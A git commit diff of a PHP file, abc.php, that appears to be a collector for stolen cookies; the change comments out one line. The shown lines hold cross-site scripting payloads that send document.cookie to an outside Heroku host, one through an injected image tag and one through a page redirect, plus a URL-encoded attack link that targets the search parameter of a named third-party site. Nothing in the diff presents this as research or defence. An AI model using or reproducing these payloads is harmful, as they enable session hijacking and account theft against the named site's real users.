e44c73e61198d5e7c121a290ad3a4f315d0ffc49
dinhgihuong <65668603+huongd17at089@users.noreply.github.com>
2020-11-15 20:49:24 +0700

    Update abc.php

--- abc.php
+++ abc.php
@@ -46,6 +46,6 @@ if (isset($_GET["abc"])) {
  //USER PHPSESSID
     //  hay!"><script>var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);</script>
    // hay!"><script>document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;</script>
-    http://matxac.com/index.php?go=search&keyword=%22%3E%3Cscript%3Edocument.location%3D%22https%3A%2F%2Fyeuvephp.herokuapp.com%2Fabc.php%3Fabc%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E&type=song#ListSearch
+//     http://matxac.com/index.php?go=search&keyword=%22%3E%3Cscript%3Edocument.location%3D%22https%3A%2F%2Fyeuvephp.herokuapp.com%2Fabc.php%3Fabc%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E&type=song#ListSearch
 }
 ?>
